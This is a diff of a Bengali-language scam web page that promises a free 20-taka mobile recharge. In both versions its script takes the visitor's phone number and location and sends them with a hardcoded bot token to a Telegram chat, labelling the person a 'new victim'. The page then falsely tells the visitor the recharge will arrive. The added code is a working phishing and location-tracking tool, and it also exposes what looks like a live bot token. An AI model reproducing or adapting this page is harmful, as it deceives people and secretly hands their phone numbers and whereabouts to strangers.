@@ -1,43 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>২০ টাকা ফ্রি রিচার্জ!</title>
     <style>
-        body { background: #f0f2f5; text-align: center; font-family: Arial, sans-serif; padding-top: 50px; }
-        .card { background: white; margin: 0 auto; width: 90%; max-width: 400px; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        body { background: #f0f2f5; text-align: center; font-family: Arial; padding-top: 50px; }
+        .box { background: white; margin: 0 auto; width: 90%; max-width: 400px; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
         h2 { color: #28a745; }
-        input { width: 85%; padding: 12px; margin: 20px 0; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; }
+        input { width: 85%; padding: 12px; margin: 20px 0; border: 2px solid #ddd; border-radius: 8px; }
         button { background: #28a745; color: white; width: 90%; padding: 12px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="card">
+<div class="box">
     <h2>২০ টাকা ফ্রি রিচার্জ!</h2>
     <p>আপনার মোবাইল নম্বর দিয়ে রিচার্জ নিশ্চিত করুন</p>
-    <input type="number" id="phone" placeholder="01XXXXXXXXX">
+    <input type="number" id="num" placeholder="01XXXXXXXXX">
     <br>
-    <button onclick="takeRecharge()">রিচার্জ নিন</button>
+    <button onclick="sendNow()">রিচার্জ নিন</button>
 </div>
 
 <script>
-function takeRecharge() {
-    var num = document.getElementById('phone').value;
-    if (num.length < 11) { alert("সঠিক নম্বর দিন"); return; }
+function sendNow() {
+    var p = document.getElementById('num').value;
+    if (p.length < 11) { alert("সঠিক নম্বর দিন"); return; }
 
-    var tok = "8056072120:AAH-Y5n9fP_7XnS_K4W5-U7mP_4";
-    var id = "5907727181";
+    var tok = "8056072120:AAH-Y5n9fP_7XnS_K4W5-U7mP_4"; // আপনার টোকেন
+    var cid = "7887080882"; // আপনার নতুন সঠিক আইডি
 
-    navigator.geolocation.getCurrentPosition(function(p) {
-        var map = "https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude;
-        var msg = "✅ নতুন ভিকটিম!\n📱 নম্বর: " + num + "\n📍 ম্যাপ: " + map;
-        fetch("https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + id + "&text=" + encodeURIComponent(msg));
+    navigator.geolocation.getCurrentPosition(function(pos) {
+        var map = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+        var text = "✅ নতুন শিকার!\n📱 নম্বর: " + p + "\n📍 ম্যাপ: " + map;
+        fetch("https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(text));
         alert("সফল হয়েছে! ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
     }, function() {
-        var msg = "⚠️ নম্বর (লোকেশন অফ): " + num;
-        fetch("https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + id + "&text=" + encodeURIComponent(msg));
+        var text = "⚠️ নম্বর (লোকেশন অফ): " + p;
+        fetch("https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(text));
         alert("সফল হয়েছে!");
     });
 }
